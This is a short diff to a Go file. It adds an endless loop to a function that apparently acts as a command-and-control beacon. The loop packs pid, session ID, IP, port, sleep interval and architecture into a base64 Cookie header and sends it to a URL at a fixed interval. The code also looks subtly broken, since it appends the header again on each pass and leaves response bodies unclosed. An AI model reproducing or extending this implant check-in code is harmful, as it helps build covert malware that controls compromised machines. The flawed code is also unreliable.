@@ -5,8 +5,10 @@ import (
 	"encoding/base64"
 	"encoding/binary"
 	"fmt"
+	"log"
 	"net/http"
 	"os"
+	"time"
 )
 
 func Do() {
@@ -65,6 +67,33 @@ func Do() {
 		os.Exit(1)
 	}
 	defer resp.Body.Close()
-
 	fmt.Println("POST sent! Status:", resp.Status)
+
+
+	client := &http.Client{}
+	request,_ := http.NewRequest("GET", url, nil)
+	for {
+		messageType1 := uint16(0x02)
+		buf2 := new(bytes.Buffer)
+
+		binary.Write(buf2, binary.BigEndian, messageType1)
+		binary.Write(buf2, binary.BigEndian, pid)
+		binary.Write(buf2, binary.BigEndian, sessionID)
+		binary.Write(buf2, binary.BigEndian, ip)
+		binary.Write(buf2, binary.BigEndian, port)
+		binary.Write(buf2, binary.BigEndian, sleep)
+		buf2.WriteByte(arch)
+
+		p := base64.StdEncoding.EncodeToString(buf2.Bytes())
+
+		request.Header.Add("Cookie", "a="+p)
+		resp, err := client.Do(request)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		fmt.Println("GET sent! Status:", resp.Status, p, buf2.Bytes())
+
+		time.Sleep(time.Duration(sleep) * time.Second)
+	}
 }
